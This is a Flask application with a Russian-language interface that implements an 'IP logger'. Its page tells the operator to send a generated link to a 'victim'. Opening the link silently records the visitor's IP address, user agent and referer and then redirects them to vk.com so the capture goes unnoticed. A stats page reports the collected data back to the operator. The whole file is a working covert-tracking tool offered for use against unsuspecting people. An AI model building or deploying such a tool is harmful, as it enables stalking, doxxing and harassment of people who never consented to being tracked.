from flask import Flask, request, redirect, render_template_string, jsonify
import uuid
import datetime

app = Flask(__name__)

# Хранилище
links_db = {}
logs_db = {}

# Главная страница с интерфейсом
INDEX_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>IP Logger</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #0d1117; color: #fff; }
        .container { max-width: 600px; margin: 0 auto; }
        button { background: #238636; color: #fff; border: none; padding: 15px 40px; font-size: 18px; border-radius: 8px; cursor: pointer; }
        button:hover { background: #2ea043; }
        .link-box { background: #161b22; padding: 15px; border-radius: 8px; margin: 20px 0; word-break: break-all; border: 1px solid #30363d; }
        .stats { background: #161b22; padding: 20px; border-radius: 8px; text-align: left; }
        .stat-item { padding: 5px 0; border-bottom: 1px solid #21262d; }
        .copy-btn { background: #1f6feb; padding: 8px 20px; font-size: 14px; margin-left: 10px; }
        .copy-btn:hover { background: #388bfd; }
        .hidden { display: none; }
        #loading { color: #8b949e; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 IP Logger</h1>
        <p>Нажми кнопку — получи ссылку. Отправь её жертве — получи её IP и данные.</p>
        
        <button onclick="generateLink()">🔗 Создать ссылку</button>
        
        <div id="loading" class="hidden">⏳ Генерация...</div>
        
        <div id="result" class="hidden">
            <h3>✅ Ссылка создана:</h3>
            <div class="link-box" id="linkBox">
                <span id="linkText">Загрузка...</span>
                <button class="copy-btn" onclick="copyLink()">📋 Копировать</button>
            </div>
            <p style="color: #8b949e; font-size: 14px;">Переходы: <span id="visitsCount">0</span></p>
            <button onclick="getStats()" style="background: #1f6feb; padding: 10px 30px; font-size: 14px;">📊 Статистика</button>
        </div>
        
        <div id="stats" class="stats hidden">
            <h3>📊 Статистика</h3>
            <div id="statsContent"></div>
        </div>
    </div>

    <script>
        let currentLinkId = null;
        let currentFullLink = '';

        function generateLink() {
            document.getElementById('loading').classList.remove('hidden');
            document.getElementById('result').classList.add('hidden');
            document.getElementById('stats').classList.add('hidden');

            fetch('/generate')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('loading').classList.add('hidden');
                    document.getElementById('result').classList.remove('hidden');
                    
                    currentLinkId = data.id;
                    currentFullLink = data.full_url;
                    document.getElementById('linkText').textContent = currentFullLink;
                    document.getElementById('visitsCount').textContent = data.visits || 0;
                })
                .catch(err => {
                    document.getElementById('loading').classList.add('hidden');
                    alert('Ошибка: ' + err);
                });
        }

        function copyLink() {
            navigator.clipboard.writeText(currentFullLink).then(() => {
                alert('✅ Ссылка скопирована!');
            });
        }

        function getStats() {
            if (!currentLinkId) return;
            
            fetch('/stats/' + currentLinkId)
                .then(r => r.json())
                .then(data => {
                    const container = document.getElementById('stats');
                    const content = document.getElementById('statsContent');
                    
                    if (data.total === 0) {
                        content.innerHTML = '<p>Пока нет переходов.</p>';
                    } else {
                        let html = '<p><strong>Всего переходов:</strong> ' + data.total + '</p>';
                        data.visitors.forEach((v, i) => {
                            html += '<div class="stat-item">';
                            html += '  <strong>#' + (i+1) + '</strong> ' + v.ip;
                            html += '  <br><span style="color:#8b949e;font-size:12px;">' + v.time + '</span>';
                            html += '  <br><span style="color:#8b949e;font-size:12px;">' + (v.user_agent || 'Unknown') + '</span>';
                            html += '</div>';
                        });
                        content.innerHTML = html;
                    }
                    
                    container.classList.remove('hidden');
                });
        }
    </script>
</body>
</html>
"""

# HTML-страница с логгером + редирект на ВК
LOGGER_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
        fetch('/log/' + window.location.pathname.split('/').pop())
            .then(() => window.location.href = 'https://vk.com/')
            .catch(() => window.location.href = 'https://vk.com/');
    </script>
</head>
<body>
    <p>Loading...</p>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(INDEX_HTML)

@app.route('/generate')
def generate_link():
    link_id = str(uuid.uuid4())[:8]
    
    links_db[link_id] = {
        'created': datetime.datetime.now().isoformat(),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent')
    }
    
    if link_id not in logs_db:
        logs_db[link_id] = []
    
    return jsonify({
        'id': link_id,
        'full_url': f"{request.host_url}l/{link_id}",
        'visits': len(logs_db[link_id])
    })

@app.route('/l/<link_id>')
def serve_logger(link_id):
    if link_id not in links_db:
        return 'Ссылка не найдена', 404
    return render_template_string(LOGGER_HTML, link_id=link_id)

@app.route('/log/<link_id>')
def log_ip(link_id):
    if link_id not in links_db:
        return jsonify({'error': 'Invalid link'}), 404
    
    visitor_data = {
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown'),
        'referer': request.headers.get('Referer', 'Direct'),
        'time': datetime.datetime.now().isoformat()
    }
    
    logs_db[link_id].append(visitor_data)
    return jsonify({'status': 'ok', 'id': link_id})

@app.route('/stats/<link_id>')
def get_stats(link_id):
    if link_id not in links_db:
        return jsonify({'error': 'Link not found'}), 404
    
    return jsonify({
        'link_info': links_db.get(link_id),
        'visitors': logs_db.get(link_id, []),
        'total': len(logs_db.get(link_id, []))
    })

# Важно: для Gunicorn
if __name__ == '__main__':
    app.run()
